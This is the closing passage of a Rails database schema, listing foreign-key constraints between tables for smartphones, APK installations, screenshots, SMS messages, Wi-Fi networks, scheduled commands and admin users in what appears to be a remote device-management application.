  add_foreign_key "remembered_devices", "admin_users"
  add_foreign_key "scheduled_command_executions", "pending_commands"
  add_foreign_key "scheduled_command_executions", "scheduled_commands"
  add_foreign_key "scheduled_commands", "smartphones"
  add_foreign_key "screenshots", "smartphones", on_delete: :cascade
  add_foreign_key "smartphones", "apk_installations"
  add_foreign_key "sms_messages", "smartphones", on_delete: :cascade
  add_foreign_key "terms_acceptances", "apk_installations", column: "device_id"
  add_foreign_key "user_preferences", "admin_users"
  add_foreign_key "wifi_networks", "smartphones"
end
